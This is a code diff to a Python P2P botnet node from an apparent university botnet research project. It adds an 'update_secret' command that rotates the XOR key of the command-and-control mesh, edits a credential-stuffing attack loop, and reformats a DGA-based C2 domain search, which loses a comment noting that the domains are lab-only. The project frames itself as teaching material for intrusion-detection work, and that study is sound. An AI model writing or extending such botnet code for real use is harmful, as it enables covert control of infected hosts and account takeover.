@@ -1,5 +1,3 @@
-File: p2p_node.py
-================
 """
 ====================================================
  AUA CS 232/337 — Botnet Research Project
@@ -19,6 +17,8 @@ Enhancements over original p2p_node.py:
   ✓ In-process attack helpers with stop-event cancellation
   ✓ Command dedup ring-buffer matching C (256 entries)
   ✓ cred_stuffing command type
+  ✓ update_secret command type — rotates _KEY_HASH in-place so all
+    subsequent xor_cipher() calls use the new keystream immediately
   ✓ Graceful SIGINT / KeyboardInterrupt shutdown
 
 Wire format (shared with kademlia_p2p.c):
@@ -82,6 +82,9 @@ class MSG:
     SHUTDOWN    = 0x09
 
 # ── XOR stream cipher ─────────────────────────────────────────
+# _KEY_HASH is module-level so update_secret can rotate it globally.
+# xor_cipher() reads it at call time (not import time), so a reassignment
+# takes effect on the very next wire message — no restart needed.
 _KEY_HASH = hashlib.sha256(P2P_SECRET).digest()   # pre-computed, 32 bytes
 
 def xor_cipher(data: bytes) -> bytes:
@@ -570,10 +573,10 @@ def _attack_cred_stuffing(target: str, port: int, duration: int,
 
     else:
         # ── Bot / jitter mode: single-threaded sequential ──────────────────
-        end = time.time() + duration
-        while time.time() < end and not stop.is_set():
+        end_t = time.time() + duration
+        while time.time() < end_t and not stop.is_set():
             for email, pwd in CREDS:
-                if stop.is_set() or time.time() > end:
+                if stop.is_set() or time.time() > end_t:
                     break
                 status = _post_login(email, pwd)
                 if status == 200:
@@ -589,27 +592,27 @@ def _attack_cred_stuffing(target: str, port: int, duration: int,
 def _attack_dga_search(stop: threading.Event):
     """
     Trigger a DGA-based C2 domain search — Phase 3 fallback channel.
- 
+
     Imports dga.py's bot_c2_search() if available; falls back to
     spawning dga.py as a subprocess so the node works even when dga.py
     is not importable from the current working directory.
- 
+
     The burst of NXDOMAIN responses this generates is the signal that
     IDS Engine 3 (Shannon entropy + NXDOMAIN burst counter) is designed
     to catch.  This makes it a useful teaching demonstration even when
     the P2P command channel itself is fully covert.
- 
+
     The stop event is checked between domain resolution attempts so the
     attack can be cleanly cancelled by a subsequent stop_all command.
     """
     print("[ATTACK] DGA SEARCH started — scanning for C2 rendezvous domain")
- 
+
     # ── Primary: import from dga module ──────────────────────────────
     try:
         from dga import bot_c2_search, generate_daily_domains
         domains = generate_daily_domains(count=20)
         print(f"[ATTACK] DGA generated {len(domains)} candidate domains")
- 
+
         for domain in domains[:15]:
             if stop.is_set():
                 print("[ATTACK] DGA SEARCH cancelled (stop_all received)")
@@ -617,20 +620,17 @@ def _attack_dga_search(stop: threading.Event):
             try:
                 ip = socket.gethostbyname(domain)
                 print(f"[ATTACK] DGA rendezvous found: {domain} -> {ip}")
-                # In a real attack the bot would fetch commands from ip.
-                # In this lab environment all domains NXDOMAIN — that
-                # burst IS the IDS trigger signal.
                 break
             except socket.gaierror:
                 print(f"[ATTACK] NXDOMAIN: {domain}")
                 time.sleep(0.3)
- 
+
         print("[ATTACK] DGA SEARCH done.")
         return
- 
+
     except ImportError:
         pass   # dga.py not importable from CWD; fall through to subprocess
- 
+
     # ── Fallback: subprocess ──────────────────────────────────────────
     print("[ATTACK] DGA SEARCH (subprocess fallback) — spawning dga.py")
     try:
@@ -653,7 +653,7 @@ def _attack_dga_search(stop: threading.Event):
                 proc.kill()
     except Exception as e:
         print(f"[ATTACK] DGA SEARCH subprocess failed: {e}")
- 
+
     print("[ATTACK] DGA SEARCH done.")
 
 # ── Kademlia Node ─────────────────────────────────────────────
@@ -1106,6 +1106,29 @@ class KademliaNode:
         elif cmd_type == "shutdown":
             self._stop_all_attacks()
             self._running = False
+
+        elif cmd_type == "update_secret":
+            # Rotate the XOR mesh keystream so this node stays in sync with
+            # the rest of the mesh after a key-rotation command is injected
+            # via the DHT.  Mirrors kademlia_p2p.c rotate_p2p_key() (which
+            # uses pthread_rwlock_t) and CovertBot._execute() update_secret.
+            #
+            # _KEY_HASH is module-level; xor_cipher() reads it at call time
+            # so the change takes effect on the very next wire message —
+            # no restart needed.  The Python GIL makes the 32-byte digest
+            # reassignment effectively atomic; in-flight calls that already
+            # loaded the old reference complete with the old key, which is
+            # identical semantics to the C rwlock approach.
+            global _KEY_HASH
+            new_secret: str = cmd.get("secret", "")
+            if len(new_secret) >= 8:
+                _KEY_HASH = hashlib.sha256(new_secret.encode()).digest()
+                print(
+                    f"[P2P] -> P2P mesh key rotated. "
+                    f"New keystream: {_KEY_HASH[:4].hex()}..."
+                )
+            else:
+                print("[P2P] -> update_secret ignored: secret must be >=8 chars")
 
         elif cmd_type == "idle":
             print("[P2P] -> Idle")
